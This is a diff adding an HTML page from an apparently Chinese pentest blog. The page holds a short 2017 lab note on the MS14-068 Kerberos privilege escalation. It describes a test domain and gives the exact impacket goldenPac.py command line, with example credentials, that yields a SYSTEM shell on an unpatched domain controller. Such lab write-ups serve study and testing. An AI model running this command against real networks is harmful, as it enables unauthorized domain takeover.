@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>ms14-068测试</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/ms14-068.html" rel="bookmark"
+           title="Permalink to ms14-068测试">ms14-068测试</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-09-05T00:00:00+02:00">
+                <a href='#'>09/05/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>允许域内任一一个普通用户将自己提升到域管权限，微软给出的补丁是kb3011780，只要没打这个补丁。GG。</p>
+<p>测试环境: 
+域: 2008R2 vul.com<br>
+jack  win7
+ubuntu</p>
+<p>测试成功的过程:</p>
+<p>在ubuntu里面先绑定域控对应的hosts，然后使用<code>impacket</code>里面的goldenpac.py </p>
+<p><code>goldenPac.py vul.com/jack:jackpasswd@dc.vul.com</code></p>
+<p>即可获取域控主机里面的system的shell。</p>
+<p><a href="http://www.mottoin.com/95877.html">http://www.mottoin.com/95877.html</a></p>
+<p>注意绑定hosts，或者指定<code>-dc-ip 192.168.x.x</code></p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
